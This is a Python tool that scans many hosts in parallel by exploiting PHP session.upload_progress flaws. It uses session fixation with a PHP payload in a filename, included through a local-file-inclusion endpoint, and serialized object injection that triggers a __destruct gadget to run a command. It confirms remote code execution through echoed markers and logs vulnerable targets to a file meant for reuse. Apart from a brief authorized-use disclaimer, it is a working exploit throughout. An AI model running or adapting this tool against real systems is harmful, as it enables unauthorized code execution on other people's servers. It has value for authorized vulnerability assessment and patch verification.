#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = []
# ///
"""Multi-host scanner for the PHP session.upload_progress RCE chains.

Reads targets from --hosts FILE (one per line: `http://ip:port`,
`https://domain`, or bare `host[:port]` -> http) and/or positional URLs,
then tests every host for:

  chain A — session fixation + filename injection:
      multipart POST with PHPSESSID in the body stores a PHP payload
      (filename, single-quote only) raw inside the attacker-chosen session
      file. If an LFI endpoint is known (--a-lfi-path), include() of the
      session file proves RCE via a computed marker.

  chain C — handler mismatch -> object injection -> __destruct:
      the payload rides in the PHP_SESSION_UPLOAD_PROGRESS value; written
      through a php_serialize directory (--c-write-path), triggered through
      a php directory (--c-read-path). Proof is the marker echoed by the
      read endpoint or the proof file (--docker).

  chain B (var_destroy memory corruption) is NOT tested — it is a local
  primitive that cannot be proven remotely.

Markers are computed at runtime (`echo 'XUP',(21*2),'-','<nonce>'` ->
`XUP42-<nonce>`) so the literal marker never appears in any echoed source;
only executed code can emit it.

Verdicts per host:
  VULNERABLE                        an RCE marker came from executed code
  FIXATED+INJECTED                  session file holds the payload (--docker),
                                    but no RCE proof (no LFI endpoint given)
  PATCHED?                          write response returned a fresh Set-Cookie
                                    -> the body SID was rejected
  MISMATCH CONFIRMED                handler-mismatch decode warning seen, but
                                    no known destruct gadget fired
  INDICATOR ONLY                    no Set-Cookie (possible fixation, unverified)
  NO SIGNALS / UNREACHABLE

Exit code: 1 if at least one host is VULNERABLE (CI-friendly), else 0.

Examples:
  uv run scan_hosts.py --hosts hosts.txt
  uv run scan_hosts.py --target http://127.0.0.1:18081 --docker p2s2-lab
  uv run scan_hosts.py --hosts prod.txt --a-lfi-path /vuln.php \\
      --a-lfi-param page --save-path /var/lib/php/sessions --workers 16

For authorized testing only — scan only systems you own or are permitted to
test.
"""
import argparse
import concurrent.futures
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone
from urllib.parse import urlparse, quote

B = "SCANBOUND"
_print_lock = threading.Lock()


def say(msg):
    with _print_lock:
        print(msg, flush=True)


def send(host, port, method, path, body=b"", headers="", scheme="http",
         timeout=10.0, verify=False):
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return None
    if scheme == "https":
        ctx = ssl.create_default_context()
        if not verify:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        try:
            sock = ctx.wrap_socket(sock, server_hostname=host)
        except (ssl.SSLError, OSError):
            sock.close()
            return None
    try:
        hosthdr = host if port in (80, 443) else f"{host}:{port}"
        hdr = (f"{method} {path} HTTP/1.1\r\nHost: {hosthdr}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n{headers}\r\n").encode()
        sock.sendall(hdr + body)
        sock.settimeout(timeout)
        resp = b""
        while True:
            try:
                d = sock.recv(65536)
                if not d:
                    break
                resp += d
            except socket.timeout:
                break
        return resp
    except OSError:
        return None
    finally:
        sock.close()


def multipart(host, port, path, sid, progress, filename, **kw):
    body = (
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\n'
        f"Z\r\n"
        f"--{B}--\r\n"
    ).encode("latin-1")
    return send(host, port, "POST", path, body,
                f"Content-Type: multipart/form-data; boundary={B}\r\n", **kw)


def status_of(resp):
    try:
        return int(resp.split(b" ", 2)[1])
    except (IndexError, ValueError):
        return 0


def body_of(resp):
    return resp.partition(b"\r\n\r\n")[2].decode("latin-1", "replace")


def session_cookie(resp):
    head = resp.partition(b"\r\n\r\n")[0].decode("latin-1", "replace")
    for line in head.split("\r\n"):
        if line.lower().startswith("set-cookie:"):
            m = re.search(r"PHPSESSID=([^;\s]+)", line, re.I)
            if m:
                return m.group(1)
    return None


def docker_exec(container, cmd):
    try:
        r = subprocess.run(["docker", "exec", container, "bash", "-c", cmd],
                           capture_output=True, text=True, timeout=30)
    except (OSError, subprocess.TimeoutExpired):
        return ""
    return (r.stdout + r.stderr).strip()


def new_marker(prefix):
    return f"{prefix}-{os.urandom(3).hex()}"


def check_chain_a(t, args):
    scheme, host, port = t
    sid = "scna" + os.urandom(8).hex()
    mk = new_marker("XUP42")
    nonce = mk.split("-", 1)[1]
    # Filename payload: single quotes ONLY (filenames truncate at the first ").
    # The marker is assembled at runtime so the echoed session-file source
    # never contains the literal XUP42-<nonce> — only executed output does.
    payload = f"<?php echo 'XUP',(21*2),'-','{nonce}';?>"
    sess_file = f"{args.save_path}/sess_{sid}"
    res = {"marker": mk, "sid": sid}

    r = multipart(host, port, args.a_write_path, sid, "x", payload,
                  scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
    if r is None:
        res.update(write_status=None, verdict="write request failed", rce=False)
        return res
    res["write_status"] = status_of(r)

    # Fixation oracle: a fresh random Set-Cookie means the body SID was
    # rejected; no cookie means the body SID was honored (or cookies are off).
    cookie = session_cookie(r)
    res["set_cookie"] = cookie
    if cookie and cookie != sid:
        res["fixation"] = "body SID rejected (fresh Set-Cookie)"
    elif cookie == sid:
        res["fixation"] = "body SID accepted (echoed in Set-Cookie)"
    else:
        res["fixation"] = "no Set-Cookie (body SID honored or cookies disabled)"

    if args.docker:
        raw = docker_exec(args.docker, f"cat {sess_file} 2>/dev/null")
        res["file_has_payload"] = payload in raw
        if res["file_has_payload"]:
            res["fixation"] += "; session file holds payload (docker-confirmed)"

    if args.a_lfi_path:
        url = f"{args.a_lfi_path}?{args.a_lfi_param}={quote(sess_file)}"
        r2 = send(host, port, "GET", url, scheme=scheme,
                  timeout=args.timeout, verify=args.verify_tls)
        res["lfi_status"] = status_of(r2) if r2 else 0
        res["rce"] = bool(r2) and mk in body_of(r2)
    else:
        res["rce"] = False
    return res


def check_chain_c(t, args):
    scheme, host, port = t
    sid = "scnc" + os.urandom(8).hex()
    mk = new_marker("XCH42")
    cmd = f"echo {mk}"
    cls, prop = args.gadget, args.gadget_prop
    cb, pb, nb = (x.encode("latin-1", "replace")
                  for x in (cls, prop, cmd))
    # Serialized gadget, built at byte level so lengths are exact:
    #   X|O:<len>:"<cls>":1:{s:<len>:"<prop>";s:<len>:"<cmd>";}
    gadget = (f'X|O:{len(cb)}:"'.encode() + cb + b'":1:{s:' + str(len(pb)).encode()
              + b':"' + pb + b'";s:' + str(len(nb)).encode() + b':"' + nb + b'";}')
    gadget = gadget.decode("latin-1")  # multipart() re-encodes latin-1
    res = {"marker": mk, "sid": sid, "cmd": cmd}

    if args.docker:
        docker_exec(args.docker, f"rm -f {args.output_path}")

    r1 = multipart(host, port, args.c_write_path, sid, gadget, "normal.txt",
                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
    if r1 is None:
        res.update(write_status=None, verdict="write request failed", rce=False)
        return res
    res["write_status"] = status_of(r1)

    r2 = multipart(host, port, args.c_read_path, sid, "x", "normal.txt",
                   scheme=scheme, timeout=args.timeout, verify=args.verify_tls)
    if r2 is None:
        res.update(read_status=None, verdict="trigger request failed", rce=False)
        return res
    res["read_status"] = status_of(r2)

    out = body_of(r2)
    res["mismatch_warning"] = "Failed to decode session object" in out
    m = re.search(r"==PROOF==\r?\n(.*?)==/PROOF==", out, re.S)
    proof = m.group(1).strip() if m else ""
    if args.docker and not proof:
        time.sleep(0.5)
        proof = docker_exec(args.docker, f"cat {args.output_path} 2>/dev/null")
    res["proof_echoed"] = bool(m)
    res["rce"] = mk in proof
    res["proof"] = proof[:200]
    return res


def scan_target(t, args):
    scheme, host, port = t
    entry = {"target": f"{scheme}://{host}:{port}"}

    r = send(host, port, "GET", "/", scheme=scheme, timeout=args.timeout,
             verify=args.verify_tls)
    if r is None:
        entry["verdict"] = "UNREACHABLE"
        return entry
    entry["root_status"] = status_of(r)

    a = None if args.skip_a else check_chain_a(t, args)
    c = None if args.skip_c else check_chain_c(t, args)
    if a:
        entry["chain_a"] = a
    if c:
        entry["chain_c"] = c

    if (a and a.get("rce")) or (c and c.get("rce")):
        entry["verdict"] = "VULNERABLE"
    elif a and a.get("file_has_payload"):
        entry["verdict"] = "FIXATED+INJECTED (no LFI proof)"
    elif a and a.get("set_cookie") and a["set_cookie"] != a.get("sid"):
        entry["verdict"] = "PATCHED? (body SID rejected)"
    elif c and c.get("mismatch_warning"):
        entry["verdict"] = "MISMATCH CONFIRMED (gadget did not fire)"
    elif a and str(a.get("fixation", "")).startswith("no Set-Cookie"):
        entry["verdict"] = "INDICATOR ONLY (no cookie; unverified fixation)"
    else:
        entry["verdict"] = "NO SIGNALS"
    return entry


def format_entry(e):
    a, c = e.get("chain_a") or {}, e.get("chain_c") or {}
    root = f"  (root HTTP {e['root_status']})" if e.get("root_status") else ""
    lines = [f"[{e['verdict']}] {e['target']}{root}"]
    if a:
        bits = [f"write HTTP {a.get('write_status')}",
                f"fixation: {a.get('fixation', '-')}"]
        if "file_has_payload" in a:
            bits.append(f"file_has_payload={a['file_has_payload']}")
        if "lfi_status" in a:
            bits.append(f"lfi HTTP {a['lfi_status']}")
        if a.get("rce"):
            bits.append(f"RCE MARKER {a['marker']}")
        lines.append("    A: " + "; ".join(bits))
    if c:
        bits = [f"write HTTP {c.get('write_status')}",
                f"read HTTP {c.get('read_status')}",
                f"mismatch_warning={c.get('mismatch_warning')}"]
        if c.get("rce"):
            bits.append(f"RCE MARKER {c['marker']}")
        elif c.get("proof"):
            bits.append(f"proof: {c['proof'][:80]}")
        lines.append("    C: " + "; ".join(bits))
    return "\n".join(lines)


def parse_target(line):
    line = line.split("#", 1)[0].strip()  # full-line and inline comments
    if not line:
        return None
    if "://" not in line:
        line = "http://" + line
    u = urlparse(line)
    scheme = (u.scheme or "http").lower()
    if scheme not in ("http", "https") or not u.hostname:
        return None
    port = u.port or (443 if scheme == "https" else 80)
    return (scheme, u.hostname, port)


def main():
    ap = argparse.ArgumentParser(
        description="Scan hosts for PHP session.upload_progress RCE chains A and C",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("targets", nargs="*",
                    help="target URLs (http://ip:port / https://domain; bare host = http)")
    ap.add_argument("--hosts", metavar="FILE",
                    help="file with one target per line (# comments and blanks ignored)")
    ap.add_argument("--skip-a", action="store_true", help="skip chain A")
    ap.add_argument("--skip-c", action="store_true", help="skip chain C")
    ap.add_argument("--a-write-path", default="/chainA/index.php",
                    help="any endpoint accepting a multipart POST (default: lab)")
    ap.add_argument("--a-lfi-path", default="/chainA/lfi.php",
                    help="LFI include endpoint; pass '' to skip the RCE step")
    ap.add_argument("--a-lfi-param", default="page", help="LFI GET parameter")
    ap.add_argument("--save-path", default="/tmp/sess", help="target's session.save_path")
    ap.add_argument("--c-write-path", default="/chainW/up.php", help="php_serialize dir")
    ap.add_argument("--c-read-path", default="/chainR/up.php", help="php dir")
    ap.add_argument("--gadget", default="Evil",
                    help="preloaded class with a weaponizable __destruct (chain C)")
    ap.add_argument("--gadget-prop", default="cmd", help="string property of the gadget")
    ap.add_argument("--output-path", default="/tmp/rce_proof",
                    help="proof file written by the gadget (--docker fallback)")
    ap.add_argument("--docker", metavar="CONTAINER",
                    help="docker exec checks (session file / proof file)")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--verify-tls", action="store_true",
                    help="verify TLS certificates (default: accept self-signed)")
    ap.add_argument("--json", metavar="FILE", help="write full results as JSON")
    ap.add_argument("--log", default="vulnerable.txt",
                    help="append VULNERABLE targets here, deduped across runs; "
                         "pass '' to disable (default: vulnerable.txt)")
    ap.add_argument("--quiet", action="store_true", help="only the final summary")
    args = ap.parse_args()

    for v in (args.gadget, args.gadget_prop):
        if "\r" in v or "\n" in v:
            print("[-] gadget class/property must not contain newlines", file=sys.stderr)
            sys.exit(2)

    lines = []
    if args.hosts:
        try:
            with open(args.hosts, encoding="utf-8") as f:
                lines = f.read().splitlines()
        except OSError as e:
            print(f"[-] cannot read {args.hosts}: {e}", file=sys.stderr)
            sys.exit(2)

    targets, seen = [], set()
    for line in lines + list(args.targets):
        t = parse_target(line)
        if t and t not in seen:
            seen.add(t)
            targets.append(t)
    if not targets:
        ap.error("no targets (pass URLs or use --hosts FILE)")

    # Log file: existing entries are loaded first so re-runs never duplicate lines.
    log_path = args.log or None
    logged, new_logged, header_done = set(), 0, False
    if log_path:
        try:
            with open(log_path, encoding="utf-8") as f:
                for line in f:
                    t = parse_target(line)
                    if t:
                        logged.add(t)
        except FileNotFoundError:
            pass
        except OSError as e:
            print(f"[-] cannot read log {log_path}: {e}", file=sys.stderr)
            log_path = None

    print(f"[*] scan_hosts.py — PHP session.upload_progress chains A+C "
          f"(chain B excluded: memory corruption is not provable remotely)")
    print(f"[*] {len(targets)} target(s), workers={args.workers}, timeout={args.timeout}s")
    print(f"[*] markers are computed at runtime — only executed code emits them")
    print(f"[*] authorized testing only: scan only systems you own or may test\n")

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, args.workers)) as ex:
        futs = {ex.submit(scan_target, t, args): t for t in targets}
        for f in concurrent.futures.as_completed(futs):
            try:
                entry = f.result()
            except Exception as e:
                entry = {"target": f"{futs[f]}", "verdict": f"ERROR ({e.__class__.__name__})"}
            results.append(entry)
            if not args.quiet:
                say(format_entry(entry))
            # stream VULNERABLE targets to the log as they are confirmed
            if entry["verdict"] == "VULNERABLE" and log_path:
                t = futs[f]
                if t not in logged:
                    logged.add(t)
                    new_logged += 1
                    chains = []
                    if (entry.get("chain_a") or {}).get("rce"):
                        chains.append("A")
                    if (entry.get("chain_c") or {}).get("rce"):
                        chains.append("C")
                    note = "+".join(chains) or "?"
                    with open(log_path, "a", encoding="utf-8") as fh:
                        if not header_done:
                            fh.write(f"# {datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} "
                                     f"vulnerable targets (one per line; reusable via --hosts)\n")
                            header_done = True
                        fh.write(f"{entry['target']}  # chains {note}\n")

    say("\n" + "=" * 78)
    for e in sorted(results, key=lambda x: x["target"]):
        say(format_entry(e))
    n_vuln = sum(1 for e in results if e["verdict"] == "VULNERABLE")
    say(f"\n[*] done: {len(results)} scanned, {n_vuln} VULNERABLE "
        f"(exit code {1 if n_vuln else 0})")
    if args.json:
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        say(f"[*] JSON written to {args.json}")
    if log_path:
        if new_logged:
            say(f"[*] {new_logged} vulnerable target(s) appended to {log_path}")
        else:
            say(f"[*] log {log_path}: no new vulnerable targets")
    sys.exit(1 if n_vuln else 0)


if __name__ == "__main__":
    main()
